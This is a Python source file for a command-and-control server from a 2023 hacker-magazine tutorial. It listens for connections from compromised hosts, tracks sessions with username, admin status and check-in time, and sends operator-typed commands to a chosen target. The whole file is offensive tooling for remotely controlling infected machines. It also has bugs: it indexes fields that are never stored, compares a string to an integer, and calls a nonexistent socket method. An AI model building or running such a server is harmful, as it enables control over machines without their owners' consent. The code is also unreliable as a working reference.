import socket
import sys
import os
import threading
from prettytable import PrettyTable
import time
from datetime import datetime

def banner():

    print('                                   .x+=:.                              s ')                                 
    print('                    ..           z`    ^%                            :8      x=~ ')                         
    print('     .d``          @L               .   <k                          .88     88x.   .e.   .e.         u.   ')
    print('     @8Ne.   .u   9888i   .dL     .@8Ned8"      .u         .u      :888ooo "8888X.x888:.x888   ...ue888b  ')
    print('     %8888:u@88N  `Y888k:*888.  .@^%8888"    ud8888.    ud8888.  -*8888888  `8888  888X `888k  888R Y888r ')
    print('      `888I  888.   888E  888I x88:  `)8b. :888`8888. :888`8888.   8888      X888  888X  888X  888R I888> ')
    print('       888I  888I   888E  888I 8888N=*8888 d888 `88%" d888 `88%"   8888      X888  888X  888X  888R I888> ')
    print('       888I  888I   888E  888I  %8"    R88 8888.+"    8888.+"      8888      X888  888X  888X  888R I888> ')
    print('     uW888L  888`   888E  888I   @8Wou 9%  8888L      8888L       .8888Lu=  .X888  888X. 888~ u8888cJ888  ')
    print('    `*88888Nu88P   x888N><888`` .888888P`  `8888c. .+ `8888c. .+  ^%888*     v`%88# "*888Y"   "*888*P"    ')
    print('   ~ ~88888F`      "88"  888  `   ^"F      "88888%    "88888%      `Y"       `~     `"          `Y"       ')
    print('      888 ^              88F                 "YP`       "YP`                                              ')
    print('      *8E               98"                                                                               ')
    print('      `8>             ./"                                                                       by D8RH8R ')
    print('        "             ~`                                                                HVCK Magazine 2023')
    print('                                                                        ')
    print('                                                        Credit to "Learn by doing python3 C2" by The Mayor')
    print('                                                                            https://ko-fi.com/s/0c3776a2a0')

# New Comm In Function
def comm_in(targ_id):
    print('[+] Awaiting response.... ')
    response = targ_id.recv(1024).decode()
    return response

# New Comm Out Function
def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

# Target Comm Update
def target_comm(targ_id):
    while True:
        message = input('Send message#> ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session.. Bye bye')
                targ_id.close()
                break
            print(response)

# Listener Handler Update
def listener_handler():
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()
    
# Comm_Handler update
def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            if admin == 1:
                admin_val = 'Yes'
            else:
                admin_val = 'No'
            
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}") 
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter Command#> ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record])
                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass



if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #host_ip = sys.argv[1]
        #host_port = int(sys.argv[2])
        host_ip = '192.168.1.103'
        host_port = 2222
        
    except IndexError:
        print('[-] Command line argument(s) missing.  Please try again.')
    except Exception as e:
        print(e)
    listener_handler()
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'status', 'Username', 'Admin', 'Target', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
                        session_counter += 1
                    print(myTable)    
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[-] Keyboard interrupt issued')
            kill_flag = 1
            sock.closed()
            break




